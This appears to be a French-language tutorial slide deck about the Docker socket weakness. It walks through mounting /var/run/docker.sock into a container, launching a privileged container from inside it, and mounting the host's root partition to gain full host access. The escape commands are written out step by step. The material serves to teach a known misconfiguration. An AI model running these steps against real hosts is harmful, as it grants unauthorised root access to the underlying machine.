%title: Docker
%author: xavki

# Docker : la faille de la socket / rootless



<br>


* faille de docker in docker ou de la socket docker

* socket 
		* port 2375 des machines docker (désactivé par défaut)
		* /var/run/

* monter la socket docker dans un conteneur (cf docker in docker DinD)

```
docker run -ti --restart unless-stopped --name dind -v /var/run/docker.sock:/var/run/docker.sock ubuntu /bin/sh
```

* un coup d'oeil à l'extérieur de qui je suis

```
ps aux | grep "docker run"
```

et on se dit que tout va bien ??? j'ai un doute

* installons docker dans le conteneur

```
apt install docker.io
```

--------------------------------------------------------------------

# Docker : la faille de la socket

<br>


* et je me mets un petit conteneur pour faire mon curieux...

```
docker run -d --name root --privileged ubuntu sleep 60000
docker exec -ti root /bin/bash
```

* où suis-je ?

Host >> conteneur (docker) >> vous êtes ici !!!


<br>


* lister les partitions

```
fdisk -l
```

<br>


* monter la partition principale

```
mount /dev/dm-1 /mnt/
ls /mnt
touch /mnt/tmp/xavki.root
```

et c'est open-bar dans /mnt
